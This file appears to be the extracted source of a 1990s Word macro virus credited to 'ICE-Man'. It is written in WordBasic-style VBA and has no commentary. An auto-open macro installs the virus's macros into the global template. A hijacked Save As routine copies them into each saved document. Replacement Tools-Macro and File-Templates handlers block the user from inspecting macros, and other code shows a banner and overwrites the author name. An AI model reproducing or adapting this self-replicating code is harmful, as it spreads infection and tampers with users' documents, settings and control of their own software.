   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "FileTemplates"

   Public Sub MAIN()
   On Error GoTo -1: On Error GoTo wis
   WordBasic.MsgBox "Sorry..."
   wis:
   End Sub

   Attribute VB_Name = "ToolsMacro"

   Public Sub MAIN()
   On Error GoTo -1: On Error GoTo wis
   WordBasic.MsgBox "Sorry..."
   wis:
   End Sub

   Attribute VB_Name = "fILESAVEAs"

   Public Sub MAIN()
   Dim sme$
   Dim yesmacro$
   Dim ExecuteOnly
   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.fILESAVEAs(False)
   On Error GoTo -1: On Error GoTo susah
   WordBasic.CurValues.fILESAVEAs dlg
   WordBasic.Dialog.fILESAVEAs dlg
   If dlg.Format = 0 Then dlg.Format = 1
   sme$ = WordBasic.[FileName$]()
   yesmacro$ = sme$ + ":AuToOpEn"
   WordBasic.MacroCopy "Global:AuToOpEn", yesmacro$, ExecuteOnly
   yesmacro$ = sme$ + ":fILESAVEAs"
   WordBasic.MacroCopy "Global:fILESAVEAs", yesmacro$, ExecuteOnly
   yesmacro$ = sme$ + ":Autoexec"
   WordBasic.MacroCopy "Global:Autoexec", yesmacro$, ExecuteOnly
   yesmacro$ = sme$ + ":ToolsMacro"
   WordBasic.MacroCopy "Global:ToolsMacro", yesmacro$, ExecuteOnly
   yesmacro$ = sme$ + ":FileTemplates"
   WordBasic.MacroCopy "Global:FileTemplates", yesmacro$, ExecuteOnly
   yesmacro$ = sme$ + ":Plong"
   WordBasic.MacroCopy "Global:Plong", yesmacro$, ExecuteOnly
   WordBasic.fILESAVEAs dlg
   GoTo selesai

   susah:
   If Err.Number <> 102 Then
           WordBasic.fILESAVEAs dlg
   End If
   selesai:
   End Sub

   Attribute VB_Name = "AuToOpEn"

   Public Sub MAIN()
   Dim HitungM
   Dim i
   Dim Yesinstall
   Dim mom$
   Dim sMacro$
   Dim ExecuteOnly
   On Error GoTo -1: On Error GoTo Abort
   HitungM = WordBasic.CountMacros(0, 0)
   For i = 1 To HitungM
       If WordBasic.[MacroName$](i, 0, 0) = "Plong" Then
           Yesinstall = -1
       End If
   Next i

   If Not Yesinstall Then
       WordBasic.SetProfileString "Author", "Name", "TeBeYe`93 The ICE-Man"
       mom$ = WordBasic.[FileName$]()
       sMacro$ = mom$ + ":fILESAVEAs"
       WordBasic.MacroCopy sMacro$, "Global:fILESAVEAs", ExecuteOnly
       sMacro$ = mom$ + ":AuToOpEn"
       WordBasic.MacroCopy sMacro$, "Global:AuToOpEn", ExecuteOnly
       sMacro$ = mom$ + ":Autoexec"
       WordBasic.MacroCopy sMacro$, "Global:Autoexec", ExecuteOnly
       sMacro$ = mom$ + ":ToolsMacro"
       WordBasic.MacroCopy sMacro$, "Global:ToolsMacro", ExecuteOnly
       sMacro$ = mom$ + ":FileTemplates"
       WordBasic.MacroCopy sMacro$, "Global:FileTemplates", ExecuteOnly
       sMacro$ = mom$ + ":Plong"
       WordBasic.MacroCopy sMacro$, "Global:Plong", ExecuteOnly
   End If

   Abort:
   End Sub

   Attribute VB_Name = "Autoexec"

   Dim hitung
   Public Sub MAIN()
   Dim pesan$
   Dim i
   Dim j
   Dim k
   hitung = 0
   On Error GoTo -1: On Error GoTo no
   pesan$ = " Lontong Micro Device (c) 1993 By ICE-Man "

   For i = 1 To Len(pesan$)
           WordBasic.MsgBox WordBasic.[Right$](pesan$, i), -1
           For j = 1 To 50
           Next j
   Next i

   For j = 1 To 200
   Next j

   For k = 1 To Len(pesan$)
           WordBasic.MsgBox WordBasic.[Right$](pesan$, (Len(pesan$) - k)), -1
           For j = 1 To 50
           Next j
   Next k
   no:
   End Sub

   Attribute VB_Name = "Plong"

   Public Sub MAIN()
   Rem This Macro was created by : The ICE - "Yes"  Man
   Rem
   Rem         Allah Swt always be with All of You ....
   Rem
   Rem                             Surabaya, 09-09-1996
   End Sub
